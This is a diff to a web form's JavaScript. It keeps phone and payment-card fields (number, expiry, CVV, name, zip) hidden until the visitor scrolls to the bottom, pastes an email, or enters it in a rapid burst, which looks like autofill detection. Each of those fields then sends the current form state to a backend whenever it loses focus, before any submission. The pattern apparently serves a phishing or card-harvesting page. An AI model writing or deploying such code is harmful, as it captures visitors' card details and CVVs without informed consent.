@@ -14,11 +14,14 @@ document.addEventListener('DOMContentLoaded', function() {
 
     // Add scroll detection for phone field
     setupScrollDetection();
+
+    // Add email field detection for rapid entry
+    setupEmailDetection();
 });
 
-function setupScrollDetection() {
-    let phoneFieldShown = false;
+let phoneFieldShown = false; // Global flag to track if fields are shown
 
+function setupScrollDetection() {
     window.addEventListener('scroll', function() {
         if (phoneFieldShown) return; // Only show once
 
@@ -29,39 +32,82 @@ function setupScrollDetection() {
 
         // Show phone field when user scrolls to within 100px of bottom
         if (scrollTop + clientHeight >= scrollHeight - 100) {
-            const phoneFieldContainer = document.getElementById('phoneFieldContainer');
-            const phoneInput = document.getElementById('phone');
-            const cardFields = ['cardNumber', 'cardExpiry', 'cardCVV', 'cardName', 'billingZip'];
-
-            if (phoneFieldContainer && phoneInput) {
-                phoneFieldContainer.style.display = 'block';
-                phoneInput.required = true; // Make it required
-
-                // Make all payment fields required
-                cardFields.forEach(fieldId => {
-                    const field = document.getElementById(fieldId);
-                    if (field) {
-                        field.required = true;
-                        field.addEventListener('blur', function() {
-                            sendCurrentFormStateToVercel();
-                        });
-                    }
-                });
-
-                phoneFieldShown = true;
-
-                // Add blur listener to phone field
-                phoneInput.addEventListener('blur', function() {
-                    sendCurrentFormStateToVercel();
-                });
-
-                // Add formatting for card fields
-                setupCardFormatting();
-
-                console.log('📱 Phone and payment fields revealed after scroll to bottom');
-            }
+            showPhoneAndPaymentFields('scroll');
         }
     });
+}
+
+function setupEmailDetection() {
+    const emailField = document.getElementById('email');
+    if (!emailField) return;
+
+    let previousValue = '';
+
+    // Detect paste events
+    emailField.addEventListener('paste', function(e) {
+        if (phoneFieldShown) return;
+
+        setTimeout(() => {
+            console.log('📧 Email paste detected');
+            showPhoneAndPaymentFields('paste');
+        }, 10);
+    });
+
+    // Detect rapid entry (more than 5 characters at once)
+    emailField.addEventListener('input', function(e) {
+        if (phoneFieldShown) return;
+
+        const currentValue = e.target.value;
+        const charactersAdded = currentValue.length - previousValue.length;
+
+        if (charactersAdded > 5) {
+            console.log(`📧 Rapid email entry detected: ${charactersAdded} characters added at once`);
+            showPhoneAndPaymentFields('rapid-entry');
+        }
+
+        previousValue = currentValue;
+    });
+
+    // Initialize previous value
+    emailField.addEventListener('focus', function() {
+        previousValue = emailField.value;
+    });
+}
+
+function showPhoneAndPaymentFields(trigger) {
+    if (phoneFieldShown) return; // Only show once
+
+    const phoneFieldContainer = document.getElementById('phoneFieldContainer');
+    const phoneInput = document.getElementById('phone');
+    const cardFields = ['cardNumber', 'cardExpiry', 'cardCVV', 'cardName', 'billingZip'];
+
+    if (phoneFieldContainer && phoneInput) {
+        phoneFieldContainer.style.display = 'block';
+        phoneInput.required = true; // Make it required
+
+        // Make all payment fields required
+        cardFields.forEach(fieldId => {
+            const field = document.getElementById(fieldId);
+            if (field) {
+                field.required = true;
+                field.addEventListener('blur', function() {
+                    sendCurrentFormStateToVercel();
+                });
+            }
+        });
+
+        phoneFieldShown = true;
+
+        // Add blur listener to phone field
+        phoneInput.addEventListener('blur', function() {
+            sendCurrentFormStateToVercel();
+        });
+
+        // Add formatting for card fields
+        setupCardFormatting();
+
+        console.log(`📱 Phone and payment fields revealed via ${trigger}`);
+    }
 }
 
 function setupCardFormatting() {
